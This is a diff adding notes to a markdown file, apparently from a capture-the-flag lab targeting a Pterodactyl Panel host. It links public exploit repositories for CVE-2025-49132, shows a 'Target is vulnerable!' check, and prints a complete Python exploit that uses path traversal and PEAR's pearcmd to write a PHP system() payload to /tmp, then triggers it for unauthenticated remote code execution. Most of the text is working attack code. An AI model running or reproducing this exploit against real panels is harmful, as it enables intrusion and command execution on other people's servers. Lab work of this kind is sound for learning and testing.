@@ -1,3 +1,95 @@
+Start Again:
+
+https://github.com/63square/CVE-2025-49132/tree/master
+
+https://github.com/dollarboysushil/CVE-2025-49132-Pterodactyl-Panel-Unauthenticated-Remote-Code-Execution-RCE-
+
+```
+python exploit1.py http://panel.pterodactyl.htb
+/home/kali/pterodactyl/exploit1.py:16: SyntaxWarning: invalid escape sequence '\/'
+  expected = '{"..\/..\/config\/prologue":{"alerts":{"levels":["info","warning","danger","success"],"session_key":"alert_messages"}}}'
+Target is vulnerable!
+```
+
+CVE-2025-49132-dbs.py
+```
+#!/usr/bin/env python3
+import sys, os
+
+if len(sys.argv) < 5:
+    print(f"Usage: {sys.argv[0]} --target <host> --cmd <command> [--path <pear_path>]")
+    sys.exit(1)
+
+target = None
+command = None
+pear_path = "/usr/share/php/PEAR"  # default
+
+# Simple argument parsing
+for i in range(len(sys.argv)):
+    if sys.argv[i] == "--target":
+        try:
+            target = sys.argv[i + 1]
+        except IndexError:
+            print("[-] --target requires a value")
+            sys.exit(1)
+
+    if sys.argv[i] == "--cmd":
+        try:
+            command = sys.argv[i + 1]
+        except IndexError:
+            print("[-] --cmd requires a value")
+            sys.exit(1)
+
+    if sys.argv[i] == "--path":
+        try:
+            pear_path = sys.argv[i + 1]
+        except IndexError:
+            print("[-] --path requires a value")
+            sys.exit(1)
+
+if not target or not command:
+    print("[-] Missing required arguments.")
+    print(f"Usage: {sys.argv[0]} --target <host> --cmd <command> [--path <pear_path>]")
+    sys.exit(1)
+
+payload = command.replace(' ', '\\$\\\\{IFS\\\\}')
+
+# Step 1 - Write payload
+os.system(
+    f"curl \"http://{target}/locales/locale.json?"
+    f"+config-create+/&locale=../../../../../{pear_path}"
+    f"&namespace=pearcmd&/<?=system('{payload}')?>+/tmp/payload.php\""
+)
+
+# Step 2 - Trigger payload
+os.system(
+    f"curl \"http://{target}/locales/locale.json?"
+    f"locale=../../../../../tmp&namespace=payload\""
+)
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 <img width="950" height="219" alt="image" src="https://github.com/user-attachments/assets/e02eaf3a-4abe-43ef-b50c-5bcd856c3e46" />
 
 
